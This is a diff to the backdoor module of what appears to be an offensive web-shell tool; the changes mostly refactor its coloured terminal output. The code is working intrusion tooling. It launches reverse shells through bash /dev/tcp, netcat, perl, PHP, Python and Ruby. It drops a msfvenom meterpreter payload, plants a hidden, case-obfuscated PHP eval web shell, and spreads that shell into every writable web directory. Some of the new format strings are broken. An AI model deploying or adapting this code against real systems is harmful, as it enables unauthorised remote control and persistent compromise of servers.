@@ -1,11 +1,13 @@
 import string
+import random
 
 from subprocess import Popen, PIPE
 from random import choice
 from itertools import product
 from base64 import b64encode
 
-from core.libs.menu import Colors, getargs
+from core.libs.menu import getargs
+from core.libs.termcolor import colored, cprint
 from core.libs.request_handler import make_request
 from core.modules.shell_handler import linux
 
@@ -38,37 +40,40 @@ class Backdoor(object):
         cmd = "for x in `whereis bash`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         bash = make_request.get_page_source(cmd)
         if bash:
-            print '\n{0}[i] Found bash:{1}'.format(Colors.GREEN, Colors.END)
+            cprint('\n[i] Found bash:')
             c = 1
             for path in bash:
-                print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
+                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                 c += 1
-            msg = '\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\''
-            msg += '{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})'
-            msg += '\n{3}[?] Press <return> when ready!{4}'
-            raw_input(msg.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
+            msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
+            msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
+            msg += colored('\n[?] Press <return> when ready!', 'yellow')
+            raw_input(msg.format(ip, port))
             for path in bash:
                 cmd = 'nohup {0} -c \'{0} -i >& /dev/tcp/{1}/{2} 0>&1\' &'.format(path, ip, port)
                 make_request.get_page_source(cmd)
-            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+            cprint('[+] Done!', 'blue')
 
     def msf(self, ip, port):
         if len(Popen("for x in `whereis msfvenom`; do file $x | grep symbolic; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
-            print '\n{0}[!] Wasn\'t able to detect the metasploit framework{1}'.format(Colors.RED, Colors.END)
+            cprint('\n[!] Wasn\'t able to detect the metasploit framework', 'red')
         else:
-            print '\n{0}[i] Found the metasploit framework:'.format(Colors.GREEN, Colors.END)
+            cprint('\n[i] Found the metasploit framework:', 'green')
             folder = linux.get_writble_dir()
             if folder:
                 filename = ''.join(choice(string.ascii_letters + string.digits) for x in range(8))
-                print '{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
+                cprint('[+] Filename: \'{0}\''.format(filename), 'green')
                 path = '{0}/{1}'.format(folder, filename)
-                raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST={1} LPORT={2} E)\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
-                print '[i] Generating linux/x86/meterpreter/reverse_tcp'
+                msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
+                msg += ' (hint: msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} E)'
+                msg += colored('\n[?] Press <return> when ready!', 'yellow')
+                raw_input(msg.format(ip, port))
+                cprint('[i] Generating linux/x86/meterpreter/reverse_tcp', 'green')
                 shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf | base64'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
                 cmd = 'echo "{0}" | base64 -i -d > {1} && chmod +x {1} && nohup {1} &'.format(shell, path)
-                print '{0}[+] Sending payload & executing{1}'.format(Colors.GREEN, Colors.END)
+                cprint('{0}[+] Sending payload & executing', 'green')
                 make_request.get_page_source(cmd)
-                print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+                cprint('[+] Done!', 'blue')
 
     def netcat(self, ip, port):
         '''
@@ -78,29 +83,35 @@ class Backdoor(object):
         cmd = "for x in `whereis nc netcat`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         netcat = make_request.get_page_source(cmd)
         if netcat:
-            print '\n{0}[i] Found netcat:'.format(Colors.GREEN, Colors.END)
+            cprint('\n[i] Found netcat:', 'green')
             c = 1
             for path in netcat:
-                print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
+                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                 c += 1
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
+            msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
+            msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
+            msg += colored('\n[?] Press <return> when ready!', 'yellow')
+            raw_input(msg.format(ip, port))
             for path in netcat:
                 cmd = 'nohup {0} {1} {2} -e /bin/bash &'.format(path, ip, port)
                 make_request.get_page_source(cmd)
-            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+            cprint('[+] Done!', 'blue')
         else:
-            print '\n{0}[!] Didn\'t find netcat on the remote system{1}'.format(Colors.RED, Colors.END)
+            cprint('\n[!] Didn\'t find netcat on the remote system', 'red')
 
     def perl(self, ip, port):
         cmd = "for x in `whereis perl`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         perl = make_request.get_page_source(cmd)
         if perl:
-            print '\n{0}[i] Found perl:'.format(Colors.GREEN, Colors.END)
+            cprint('\n[i] Found perl:', 'green')
             c = 1
             for path in perl:
-                print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
+                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                 c += 1
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
+            msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
+            msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
+            msg += colored('\n[?] Press <return> when ready!', 'yellow')
+            raw_input(msg.format(ip, port))
             for path in perl:
                 cmd = 'nohup {0} -e '.format(path)
                 cmd += '\'use Socket;'
@@ -110,9 +121,9 @@ class Backdoor(object):
                 cmd += 'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");'
                 cmd += 'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' &'
                 make_request.get_page_source(cmd)
-            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+            cprint('[+] Done!', 'blue')
         else:
-            print '\n{0}[!] Didn\'t find perl on the remote system{1}'.format(Colors.RED, Colors.END)
+            cprint('\n[!] Didn\'t find perl on the remote system', 'red')
 
     def php(self, ip, ourIP):
         wwwroot = linux.get_doc_root()
@@ -120,24 +131,24 @@ class Backdoor(object):
         folder = make_request.get_page_source(cmd)
         if folder:
             folder = folder[0]
-            print '\n{0}[+] Found a writable directory: \'{1}\'{2}'.format(Colors.GREEN, folder, Colors.END)
+            cprint('\n[+] Found a writable directory: \'{1}\''.format(folder), 'green')
             filename = '.' + ''.join(choice(string.ascii_letters + string.digits) for x in range(8)) + '.php'
-            print '{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
+            cprint('[+] Filename: \'{1}\''.format(filename), 'green')
             location = '{0}/{1}'.format(folder, filename)
 
             cmd = 'find {0} -type f -print'.format(wwwroot)
             files = make_request.get_page_source(cmd)
-            print '{0}[i] Select a file to \'clone\' (or \'0\' to skip):{1}'.format(Colors.GREEN, Colors.END)
-            print '{0} 0.) Don\'t close - create new{1}'.format(Colors.GREEN, Colors.END)
+            cprint('[i] Select a file to \'clone\' (or \'0\' to skip):', 'green')
+            cprint(' 0.) Don\'t close - create new', 'green')
             path = []
             c = 0
             for file in files:
                 path.append(file)
                 c += 1
-                print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, file, Colors.END)
+                cprint('{0:2d}.) {1}'.format(c, file), 'green')
             while True:
                 try:
-                    clone = int(raw_input('{0}[>] Which file to use? [0-{1}]{2}: '.format(Colors.GREEN, c, Colors.END)))
+                    clone = int(raw_input(colored('[>] Which file to use? [0-{0}: '.format(c))))
                     if 0 <= clone <= c:
                         break
                 except ValueError:
@@ -146,7 +157,7 @@ class Backdoor(object):
             if clone != 0:
                 cmd = 'cp -f {0} {1}'.format(path[int(clone) - 1], location)
                 make_request.get_page_source(cmd)
-            print '{0}[+] Creating our \'evil\' file: \'{1}\'{2}'.format(Colors.GREEN, location, Colors.END)
+            cprint('[+] Creating our \'evil\' file: \'{0}\''.format(location), 'green')
             parameter = ''.join(choice(string.ascii_lowercase) for x in range(6))
             casePayload = choice(map(''.join, product(*((c.upper(), c.lower()) for c in 'eval'))))
             caseShell = choice(map(''.join, product(*((c.upper(), c.lower()) for c in 'php eval(base64_decode'))))
@@ -155,58 +166,61 @@ class Backdoor(object):
             evilFile = "<?{0}(\"{1}\")); ?>".format(caseShell, payloadEncoded)
             cmd = 'echo \'{0}\' >> \"{1}\"'.format(evilFile, location)
             make_request.get_page_source(cmd)
-            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+            cprint('[+] Done!', 'blue')
             uri = folder[len(wwwroot):]
 
             #>>> '/'.join('https://localhost/html/shell.php'.split('/', 3)[:3])
             #'https://localhost'
             url = '/'.join(getargs.url.split('/', 3)[:3])
-            example = """{green}Example:
+            example = """Example:
             curl "{url}{uri}/{filename}?{parameter}=phpinfo()"
             curl "{url}{uri}/{filename}?{parameter}=require(\'/etc/passwd\')"
             curl "{url}{uri}/{filename}?{parameter}=system(\'/sbin/ifconfig\')"
-            msfcli exploit/unix/webapp/php_eval RHOST={url} RPORT=80 PHPURI={uri}/{filename}?{parameter}=\!CODE\! PAYLOAD=php/meterpreter/reverse_tcp LHOST={ourIP} LPORT=4444 E
-            {end}""".format(
-                    green=Colors.GREEN,
-                    end=Colors.END,
+            msfcli exploit/unix/webapp/php_eval RHOST={url} RPORT=80 PHPURI={uri}/{filename}?{parameter}=\!CODE\! PAYLOAD=php/meterpreter/reverse_tcp LHOST={ourIP} LPORT=4444 E""".format(
                     url=url,
                     uri=uri,
                     filename=filename,
                     parameter=parameter,
                     ourIP=ourIP,)
-            print example
+            cprint(example, 'green')
         else:
-            print '\n{0}[!] Unable to find a writable directory'.format(Colors.RED, Colors.END)
+            cprint('\n[!] Unable to find a writable directory', 'red')
 
     def php_cli(self, ip, port):
         cmd = "for x in `whereis php`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         php = make_request.get_page_source(cmd)
         if php:
-            print '\n{0}[i] Found php-cli:'.format(Colors.GREEN, Colors.END)
+            cprint('\n[i] Found php-cli:', 'green')
             c = 1
             for path in php:
-                print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
+                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                 c += 1
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
+            msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
+            msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
+            msg += colored('\n[?] Press <return> when ready!', 'yellow')
+            raw_input(msg.format(ip, port))
             for path in php:
                 cmd = 'nohup {0} -r '.format(path)
                 cmd += '\'$sock=fsockopen("{0}",{1});'.format(ip, port)
                 cmd += 'exec("/bin/sh -i <&3 >&3 2>&3");\' &'
                 make_request.get_page_source(cmd)
-            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+            cprint('[+] Done!', 'blue')
         else:
-            print '\n{0}[!] Didn\'t find php-cli on the remote system{1}'.format(Colors.RED, Colors.END)
+            cprint('\n[!] Didn\'t find php-cli on the remote system', 'red')
 
     def python(self, ip, port):
         cmd = "for x in `whereis python`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         python = make_request.get_page_source(cmd)
         if python:
-            print '\n{0}[i] Found python:'.format(Colors.GREEN, Colors.END)
+            cprint('\n[i] Found python:', 'green')
             c = 1
             for path in python:
-                print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
+                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                 c += 1
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
+            msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
+            msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
+            msg += colored('\n[?] Press <return> when ready!', 'yellow')
+            raw_input(msg.format(ip, port))
             for path in python:
                 cmd = 'nohup {0} -c '.format(path)
                 cmd += '\'import socket,subprocess,os;'
@@ -217,79 +231,78 @@ class Backdoor(object):
                 cmd += 'os.dup2(s.fileno(),2);'
                 cmd += 'p=subprocess.call(["/bin/sh","-i"]);\' &'
                 make_request.get_page_source(cmd)
-            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+            cprint('[+] Done!', 'blue')
         else:
-            print '\n{0}[!] Didn\'t find python on the remote system{1}'.format(Colors.RED, Colors.END)
+            cprint('\n[!] Didn\'t find python on the remote system', 'red')
 
     def ruby(self, ip, port):
         cmd = "for x in `whereis ruby`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         ruby = make_request.get_page_source(cmd)
         if ruby:
-            print '\n{0}[i] Found ruby:'.format(Colors.GREEN, Colors.END)
+            cprint('\n[i] Found ruby:', 'green')
             c = 1
             for path in ruby:
-                print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
+                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                 c += 1
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
+            msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
+            msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
+            msg += colored('\n[?] Press <return> when ready!', 'yellow')
+            raw_input(msg.format(ip, port))
             for path in ruby:
                 cmd = 'nohup {0} -rsocket -e'.format(path)
                 cmd += '\'f=TCPSocket.open("{0}",{1}).to_i;'.format(ip, port)
                 cmd += 'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &'
                 make_request.get_page_source(cmd)
-            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+            cprint('[+] Done!', 'blue')
         else:
-            print '\n{0}[!] Didn\'t find ruby on the remote system{1}'.format(Colors.RED, Colors.END)
+            cprint('\n[!] Didn\'t find ruby on the remote system', 'red')
 
     # A method to spread the shell in all writable directories
     def spread(self):
-        provided_shell_name = raw_input('\n{0}[?] Current shell name{1}: '.format(Colors.GREEN, Colors.END))
+        provided_shell_name = raw_input(colored('\n[?] Current shell name: ', 'green'))
         shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
         cmd = 'find {0} -depth -perm -0002 -type d | xargs -n 1 cp -v {1}'.format(linux.get_doc_root(), shell_name)
         done = make_request.get_page_source(cmd)
         if done:
-            success = '\n[+] {hot}{shell_name}{end} already written to {hot}{writable_length}{end} paths'.format(
+            success = '\n[+] {shell_name}{end} already written to {hot}{writable_length} paths'.format(
                     shell_name=shell_name,
-                    writable_length=len(done),
-                    hot=Colors.HOT,
-                    end=Colors.END,)
-            success += '\n[+] To check these paths type {0}@enum writable{1}'.format(Colors.HOT, Colors.END)
-            print success
+                    writable_length=len(done))
+            success += '\n[+] To check these paths type @enum writable'
+            cprint(success, 'blue')
         else:
-            print '\n{0}[!] Something went wrong while spreading shell{1}'.format(Colors.RED, Colors.END)
+            cprint('\n[!] Something went wrong while spreading shell', 'red')
 
-    def xterm(self, ip,port):
+    def xterm(self, ip, port):
         cmd = "for x in `whereis xterm`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         xterm = make_request.get_page_source(cmd)
         if xterm:
-            print '\n{0}[i] Found xterm:'.format(Colors.GREEN, Colors.END)
+            cprint('\n[i] Found xterm:', 'green')
             c = 1
             for path in xterm:
-                print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
+                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                 c += 1
             #raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
             for path in xterm:
                 cmd = 'nohup {0} xterm -display {1}:1 &'.format(path, ip)
                 make_request.get_page_source(cmd)
-            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+            cprint('[+] Done!', 'blue')
         else:
-            print '\n{0}[!] Didn\'t find xterm on the remote system{1}'.format(Colors.RED, Colors.END)
-    def testall(self,ip,port):
-        import random
-        modules = [self.ruby,self.python,self.php_cli,self.xterm,self.perl,self.bash,self.msf,self.netcat]
+            cprint('\n[!] Didn\'t find xterm on the remote system', 'red')
+
+    def testall(self, ip, port):
+        modules = [self.ruby, self.python, self.php_cli, self.xterm, self.perl, self.bash, self.msf, self.netcat]
         print 'This module will test all the Backdoors in a random order until you get a conection on netcat.'
-        msg = '\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\''
-        msg += '{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})'
-        msg += '\n{3}[?] Press <return> when ready!{4}'
-        raw_input(msg.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
-        for i in xrange(1,len(modules)+1):
+        msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
+        msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
+        msg += colored('\n[?] Press <return> when ready!', 'yellow')
+        raw_input(msg.format(ip, port))
+        for i in xrange(1, len(modules) + 1):
             call = random.choice(modules)
             try:
                 modules.remove(call)
-                call(ip,port)
+                call(ip, port)
             except:
                 pass
             print "-------------------------------------------------"
-            
-        
-        
+
 backdoor = Backdoor()
